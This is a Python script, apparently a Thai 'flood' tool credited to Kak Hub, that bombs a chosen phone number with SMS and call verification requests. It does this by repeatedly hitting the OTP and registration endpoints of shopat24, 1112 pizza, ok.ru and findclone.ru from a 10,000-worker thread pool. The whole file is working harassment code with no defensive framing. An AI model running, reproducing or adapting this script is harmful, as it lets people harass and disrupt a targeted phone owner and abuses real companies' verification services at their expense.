import time
from requests import Session,post,get
from re import search
from concurrent.futures import ThreadPoolExecutor 
from time import sleep

headers = {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"}

"""api sms shopat24"""
def shopat(phone):
    s=Session()
    s.headers.update(headers)
    token=search('<meta name="_csrf" content="(.*)" />',s.get("https://www.shopat24.com/register/").text).group(1)
    d=s.post("https://www.shopat24.com/register/ajax/requestotp/",data=f"phoneNumber={phone}",headers={"content-type": "application/x-www-form-urlencoded; charset=UTF-8","x-csrf-token": token}).status_code
    if d == 200:
        print("[*] ยิงเเล้วครับน้องรัก")
    else : 
        print("[*] ยิงเเล้วครับน้องรัก")

"""api sms pizza1112"""
def p1112(phone):
    d=post('https://api2.1112.com/api/v1/otp/create',json={"phonenumber":phone,"language":"th"},headers=headers).status_code
    if d == 200:
        print("[*] ยิงเเล้วครับน้องรัก")
    else : 
        print("[*] ยิงเเล้วครับน้องรัก")

"""api sms pizza1112 v2"""
def p1112v2(phone):
    d=post('https://api.1112delivery.com/api/v1/otp/create',json={"phonenumber":phone,"language":"th"},headers=headers).status_code
    if d == 200:
        print("[*] ยิงเเล้วครับน้องรัก")
    else : 
        print("[*] ยิงเเล้วครับน้องรัก")

"""api call okru"""
def okru(phone):
    s=Session()
    s.headers.update({"User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38","Content-Type" : "application/x-www-form-urlencoded","Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"})
    s.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data=f"st.r.phone=+66{phone[1:]}")
    s.post("https://ok.ru/dk?cmd=AnonymRegistrationAcceptCallUI&st.cmd=anonymRegistrationAcceptCallUI",data="st.r.fieldAcceptCallUIButton=Call")
    print("[*] ยิงเเล้วครับน้องรัก")

"""api call findclone"""
def findclone(phone):
    d=get(f"https://findclone.ru/register?phone=+66{phone[1:]}",headers={"X-Requested-With" : "XMLHttpRequest","User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36"}).json()
    if d.get("Error",False) == "Wait for timeout":
        print("[*] ยิงเเล้วครับน้องรัก")
    else :
        print("[*] ยิงเเล้วครับน้องรัก")


"""loop func """
def loop(pho):
    for _ in range(2):
        exec.submit(okru,pho) # call
        exec.submit(findclone,pho) # call
        exec.submit(shopat,pho) # sms
        exec.submit(p1112,pho) # sms
        exec.submit(p1112v2,pho) #sms
        sleep(10)

def colored(r, g, b, text):
    return "\033[38;2;{};{};{}m{} \033[38;2;255;255;255m".format(r, g, b, text)
  
text = """KAK HUB ยิงเบอร์"""
colored_text = colored(255, 95, 0, text)
print(colored_text)

def colored(r, g, b, text):
    return "\033[38;2;{};{};{}m{} \033[38;2;255;255;255m".format(r, g, b, text)

text = '[  > : Kak Hub flood By Doit.#5739 : <  ]'
credit = colored(255, 0, 0, text)
time.sleep(.5)
print(credit)

def colored(r, g, b, text):
    return "\033[38;2;{};{};{}m{} \033[38;2;255;255;255m".format(r, g, b, text)
  
text = '[!] เบอร์ที่จะยิง >> : '
phone = colored(0, 255, 0, text)

def colored(r, g, b, text):
    return "\033[38;2;{};{};{}m{} \033[38;2;255;255;255m".format(r, g, b, text)
  
text = '[!] จำนวนที่จะยิง >> : '
quantity = colored(0, 255, 0, text)

if __name__ == "__main__":
    exec=ThreadPoolExecutor(max_workers=10000)
    time.sleep(.5)
    pho = input(phone)
    time.sleep(.5)
    i = int(input(quantity))
    exec.submit(loop,pho)
    for _ in range(i):
        exec.submit(shopat,pho) # sms
        exec.submit(p1112,pho) # sms
        exec.submit(p1112v2,pho) # sms